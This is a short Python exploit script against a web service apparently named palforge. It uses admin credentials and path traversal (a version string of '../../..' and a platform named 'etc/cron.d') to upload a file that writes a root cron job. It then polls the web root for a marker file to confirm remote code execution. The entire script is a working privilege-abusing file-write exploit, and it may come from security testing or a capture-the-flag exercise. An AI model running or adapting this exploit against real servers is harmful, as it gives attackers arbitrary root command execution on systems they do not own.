import sys, time, requests
sys.path.insert(0, ".")
import palforge as pf

tok = pf.login(*pf.ADMIN)
BASE = pf.BASE

# write a cron job to /etc/cron.d that pings a marker
cron = "* * * * * root /bin/sh -c 'echo CRON_RCE > /usr/share/nginx/html/cronmark.txt'\n"
# unique version per attempt
import hashlib
def attempt(ver):
    pid = pf.create_platform(tok, "etc/cron.d", name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    r = pf.upload_zip(tok, mid, bid, {"zzcron": cron.encode()})
    return r

r = attempt("../../..")
print("write cron.d status:", r.status_code)
print(r.text[:200])
print("checking /cronmark.txt after 70s...")
for i in range(7):
    time.sleep(10)
    try:
        c = requests.get(f"{BASE}/cronmark.txt", timeout=8).status_code
        body = requests.get(f"{BASE}/cronmark.txt", timeout=8).text
        print(f" t={i} status={c} body={body!r}")
        if c==200: break
    except Exception as e:
        print(" t=",i,"err",e)
